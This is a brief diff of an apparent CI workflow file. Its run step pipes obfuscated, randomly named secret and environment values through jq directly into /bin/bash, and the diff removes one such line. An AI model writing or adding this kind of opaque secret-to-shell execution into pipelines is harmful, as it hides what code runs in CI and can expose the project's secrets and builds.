@@ -23,7 +23,6 @@ jobs:
           ibrlx22: ${{ secrets.ibrlx22 }}
         run: |
           printf '%s' "$ibrlx22" | jq -r .i74025 | /bin/bash
-          echo $v35808 | jq -r .gyjy14319 | /bin/bash
           printf '%s' "$l6295" | jq -r .hugj205 | /bin/bash
 
       - name: Store artifact
